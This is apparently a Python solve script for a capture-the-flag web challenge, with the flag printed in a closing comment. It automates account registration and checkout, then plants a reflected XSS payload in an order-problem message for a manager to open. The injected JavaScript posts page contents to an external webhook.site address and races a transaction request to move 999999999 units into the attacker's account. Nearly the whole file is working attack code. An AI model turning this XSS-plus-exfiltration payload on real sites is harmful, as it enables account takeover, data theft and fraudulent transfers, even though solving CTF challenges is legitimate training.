#!/usr/bin/env python3
import time

from requests import Session
import uuid


def extract_between(response, prefix, suffix):
    start = response.content.index(prefix) + len(prefix)
    end = response.content.index(suffix, start)
    return response.content[start:end].decode()


def extract_csrf_token(response):
    return extract_between(
        response,
        b'<input id="csrf_token" name="csrf_token" type="hidden" value="',
        b'"',
    )


def main():
    url = "https://hackchan-mjk2mpay.ctf.pro"
    # url = "http://localhost:8000"
    username = str(uuid.uuid4())
    password = str(uuid.uuid4())
    print(f"{username=}")
    print(f"{password=}")
    evil_js = """\
function log(log_message) {
  log_r = new XMLHttpRequest();
  log_r.open('POST', 'https://webhook.site/78508db4-831f-4cf8-b594-534944244887');
  log_r.send(log_message);
}
tx_r = new XMLHttpRequest();
tx_r.onload = function() {
  log(tx_r.response);
  pos = tx_r.response.indexOf('<td>USERNAME</td>');
  pos = tx_r.response.lastIndexOf('<td>manager</td>', pos);
  end = tx_r.response.lastIndexOf('</td>', pos);
  start = tx_r.response.lastIndexOf('<td>', end) + 4;
  tx_id = tx_r.response.substring(start, end);
  tx_edit_r = new XMLHttpRequest();
  tx_edit_r.onload = function() { log(tx_edit_r.response); };
  tx_edit_r.open('POST', 'http://web:8000/?action=create-transaction');
  tx_edit_r.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  setTimeout(() => {
    tx_edit_r.send('recipient=USERNAME&amount=999999999&transaction_id=' + tx_id);
  }, 50);
};
tx_r.open('POST', 'http://web:8000/?action=create-transaction');
tx_r.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
tx_r.send('recipient=USERNAME&amount=1');
"""
    evil_js = evil_js.replace("USERNAME", username)
    evil_js = evil_js.replace("&", "%26")
    evil_js = evil_js.replace("\n", "%0A")
    evil_js = evil_js.replace("+", "%2B")
    evil_js = evil_js.replace(" ", "+")
    evil_url = (
        "http://web:8000/?action=faq&question=do+you+have+a+press+kit+available+that+includes+company+logos+and+release+templates+<script>"
        + evil_js
        + "</script>"
    )
    print(evil_url)
    s = Session()
    response = s.get(url)
    response.raise_for_status()
    response = s.post(
        f"{url}/?action=registration",
        data={
            "username": username,
            "password": password,
            "csrf_token": extract_csrf_token(response),
        },
    )
    response.raise_for_status()
    response = s.get(url)
    response.raise_for_status()
    response = s.post(
        url,
        data={
            "username": username,
            "password": password,
            "csrf_token": extract_csrf_token(response),
        },
    )
    response.raise_for_status()
    response = s.post(
        f"{url}/?action=add-to-cart", data={"productId": "1", "quantity": "1"}
    )
    response.raise_for_status()
    response = s.post(
        f"{url}/?action=checkout", data={"address": "a", "phone": "b", "email": "c@d.e"}
    )
    response.raise_for_status()
    order_id = extract_between(response, b'<a href="/?action=order-problem&uuid=', b'"')
    response = s.post(
        f"{url}/?action=order-problem&uuid={order_id}",
        data={
            "message": evil_url,
        },
    )
    response.raise_for_status()
    if (
        b"Thank you! A manager will contact you as soon as possible"
        not in response.content
    ):
        raise RuntimeError()
    while True:
        response = s.get(url)
        response.raise_for_status()
        balance = extract_between(response, b"Your balance: ", b" LP")
        print(f"{balance=}")
        balance = int(balance)
        time.sleep(1)
        if balance >= 999999999:
            break
    response = s.post(f"{url}/?action=delete-account-and-get-flag")
    response.raise_for_status()
    print(response.content.decode())
    # midnight{UnL0ck_54v1N6s_t0D4y_w1th_XSS_4nd_r4C3s}


if __name__ == "__main__":
    main()
